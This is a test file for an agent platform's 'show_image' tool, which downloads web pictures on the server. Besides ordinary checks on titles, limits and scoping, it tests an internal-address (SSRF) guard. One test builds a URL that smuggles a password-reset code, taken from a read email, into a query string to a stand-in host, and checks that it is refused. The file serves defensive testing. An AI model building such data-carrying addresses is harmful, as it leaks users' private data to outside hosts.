import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { eq, schema } from "@agenteschat/db";
import { fakeImagePng } from "@agenteschat/providers/testing";
import {
  absorbToolData,
  BUILTIN_TOOLS,
  createWebToolSource,
  insertMessage,
  isCore,
  SHOW_IMAGE_LIMITS,
  type ToolContext,
  type ToolDefinition,
  toolKind,
} from "../src";
import { confidentialLockAllows } from "../src/tools/confidential-lock";
import { type Fixture, setup } from "./fixtures";

/**
 * `show_image` (ADR 0217): a picture from the web goes on the agent's reply as a picture file the server downloaded,
 * through the same guard as a live file's picture, and never as an address the apps would load.
 */

let f: Fixture;
beforeAll(async () => {
  f = await setup();
});
afterAll(async () => {
  await f.close();
});

const PNG = fakeImagePng("sky", "16:9");
const TALL = fakeImagePng("tower", "9:16");

const picture = (bytes: Uint8Array) =>
  new Response(bytes as Uint8Array<ArrayBuffer>, { headers: { "content-type": "image/png" } });

/** A fake web: pictures by address; hosts under `.internal.example` resolve to a private address. */
function web(routes: Record<string, () => Response>, artifacts = true) {
  const asked: string[] = [];
  const source = createWebToolSource({
    fetch: async (url) => {
      asked.push(url);
      return routes[url]?.() ?? new Response("not found", { status: 404 });
    },
    resolveHost: async (host) => (host.endsWith(".internal.example") ? ["10.0.0.7"] : ["93.184.216.34"]),
    ...(artifacts ? { artifacts: f.artifactDeps } : {}),
  });
  return { asked, source };
}

/** A run in #general answering the owner, with these earlier tool results; its tool context. */
async function runWith(results: [name: string, content: string][] = []): Promise<ToolContext> {
  const trigger = await insertMessage(f.db, {
    orgId: f.org.id,
    channelId: f.general.id,
    author: { type: "person", userId: f.owner.id },
    body: "@dev show me the pictures",
  });
  const [run] = await f.db
    .insert(schema.agentRuns)
    .values({
      orgId: f.org.id,
      agentId: f.agent.id,
      channelId: f.general.id,
      threadRootId: trigger.id,
      triggerMessageId: trigger.id,
      trigger: "mention",
      hop: 1,
      status: "running",
    })
    .returning();
  if (!run) throw new Error("no run");
  let seq = 0;
  for (const [i, [name, content]] of results.entries()) {
    for (const [kind, data] of [
      ["tool_call", { toolUseId: `t${i}`, name, input: {} }],
      ["tool_result", { toolUseId: `t${i}`, name, content }],
    ] as const) {
      await f.db.insert(schema.agentRunSteps).values({ orgId: f.org.id, runId: run.id, seq: ++seq, kind, data });
    }
  }
  return {
    db: f.db,
    orgId: f.org.id,
    agentId: f.agent.id,
    runId: run.id,
    channelId: f.general.id,
    threadRootId: trigger.id,
    triggerMessageId: trigger.id,
  };
}

async function toolOf(source: ReturnType<typeof web>["source"], ctx: ToolContext): Promise<ToolDefinition> {
  const tool = (await source.tools(ctx)).find((t) => t.name === "show_image");
  if (!tool) throw new Error("no show_image");
  return tool;
}

type Shown = { id: string; version: number; title: string; width?: number; height?: number };
const filesOf = (data: Record<string, unknown> | undefined) => (data?.artifacts ?? []) as Shown[];

describe("show_image", () => {
  test("each picture is downloaded by the server and saved where the run posts, in the order asked", async () => {
    const w = web({
      "https://pics.example.com/a/sky-at-dusk.png": () => picture(PNG),
      "https://pics.example.com/img/5b2e9c417ad03f68e1c4b7a920d6f3c8.png": () => picture(TALL),
    });
    const ctx = await runWith();
    const out = await (await toolOf(w.source, ctx)).execute(
      {
        images: [
          { url: "http://pics.example.com/a/sky-at-dusk.png" },
          { url: "https://pics.example.com/img/5b2e9c417ad03f68e1c4b7a920d6f3c8.png", title: "Lighthouse" },
        ],
      },
      ctx,
    );
    expect(out.isError).toBeUndefined();
    const files = filesOf(out.data);
    // A name in the address is the title; a hash says nothing, so the agent's own words are.
    expect(files.map((x) => x.title)).toEqual(["sky at dusk", "Lighthouse"]);
    expect(files[0]).toMatchObject({ version: 1, width: 96, height: 54 });
    expect(files[1]).toMatchObject({ width: 54, height: 96 });
    expect(out.content).toContain("2 pictures go on your reply");
    for (const file of files) expect(out.content).toContain(file.id);
    // Plain http was asked over https.
    expect(w.asked[0]).toBe("https://pics.example.com/a/sky-at-dusk.png");

    const rows = await f.db.select().from(schema.artifacts).where(eq(schema.artifacts.channelId, f.general.id));
    const saved = rows.filter((r) => files.some((x) => x.id === r.id));
    expect(saved.map((r) => r.kind)).toEqual(["file", "file"]);
    // The reply carries them as its files, as it does the pictures an agent makes.
    const effects: Parameters<typeof absorbToolData>[0] = {};
    absorbToolData(effects, out.data);
    expect(effects.artifacts?.map((a) => a.id)).toEqual(files.map((x) => x.id));
  });

  test("what isn't a picture is said, and the others are still shown", async () => {
    const w = web({
      "https://pics.example.com/sky.png": () => picture(PNG),
      "https://shop.example.com/product/12": () =>
        new Response("<html></html>", { headers: { "content-type": "text/html" } }),
    });
    const ctx = await runWith();
    const out = await (await toolOf(w.source, ctx)).execute(
      { images: [{ url: "https://shop.example.com/product/12" }, { url: "https://pics.example.com/sky.png" }] },
      ctx,
    );
    expect(out.isError).toBeUndefined();
    expect(filesOf(out.data)).toHaveLength(1);
    expect(out.content).toContain("The picture goes on your reply");
    expect(out.content).toContain("Not shown");
    expect(out.content).toContain("https://shop.example.com/product/12: ");
    expect(out.content).toContain("not a picture");
  });

  test("an internal address is never asked, and nothing is saved", async () => {
    const w = web({});
    const ctx = await runWith();
    const out = await (await toolOf(w.source, ctx)).execute(
      { images: [{ url: "https://files.internal.example/logo.png" }] },
      ctx,
    );
    expect(out.isError).toBe(true);
    expect(out.content).toContain("No picture was shown");
    expect(out.data).toBeUndefined();
    expect(w.asked).toEqual([]);
  });

  test("an address that carries what the run read in private is refused before any request (ADR 0117)", async () => {
    const w = web({});
    const ctx = await runWith([
      [
        "mail_read",
        "From: support@shop.example\nYour reset code is 448812. Use it within 10 minutes and never share it with anyone.",
      ],
    ]);
    const leak = `https://x.example.net/p.png?c=${encodeURIComponent("448812 Use it within 10 minutes and never share")}`;
    const out = await (await toolOf(w.source, ctx)).execute({ images: [{ url: leak }] }, ctx);
    expect(out.isError).toBe(true);
    expect(w.asked).toEqual([]);
  });

  test("a turn shows at most the limit: past it the tool says to give links", async () => {
    const urls = Array.from({ length: SHOW_IMAGE_LIMITS.perRun + 1 }, (_, i) => `https://pics.example.com/${i}.png`);
    const w = web(Object.fromEntries(urls.map((u) => [u, () => picture(PNG)])));
    const ctx = await runWith();
    const tool = await toolOf(w.source, ctx);
    const first = await tool.execute({ images: urls.slice(0, SHOW_IMAGE_LIMITS.perCall).map((url) => ({ url })) }, ctx);
    expect(filesOf(first.data)).toHaveLength(SHOW_IMAGE_LIMITS.perCall);
    const second = await tool.execute({ images: urls.slice(SHOW_IMAGE_LIMITS.perCall).map((url) => ({ url })) }, ctx);
    expect(filesOf(second.data)).toHaveLength(SHOW_IMAGE_LIMITS.perRun - SHOW_IMAGE_LIMITS.perCall);
    expect(second.content).toContain(`over ${SHOW_IMAGE_LIMITS.perRun} pictures in one turn`);
    const third = await tool.execute({ images: [{ url: urls[0] }] }, ctx);
    expect(third.isError).toBe(true);
    expect(third.content).toContain("give the others as links");
  });

  test("offered only where its pictures can be saved; every agent's, listed in every run, speaking here", async () => {
    const ctx = await runWith();
    const without = await web({}, false).source.tools(ctx);
    expect(without.map((t) => t.name).sort()).toEqual(["image_search", "web_fetch", "web_search"]);
    const tool = await toolOf(web({}).source, ctx);
    expect(tool.scope).toBe("");
    expect(BUILTIN_TOOLS[""]).toContain("show_image");
    expect(isCore(tool)).toBe(true);
    // In the run's own conversation: a routine, which speaks only through its report, never shows one.
    expect(toolKind(tool)).toEqual({ kind: "here" });
    // An address leaves the server: not in a confidential thread.
    expect(confidentialLockAllows(tool, { own: false, marking: [], asksOutside: false })).toBe(false);
  });
});
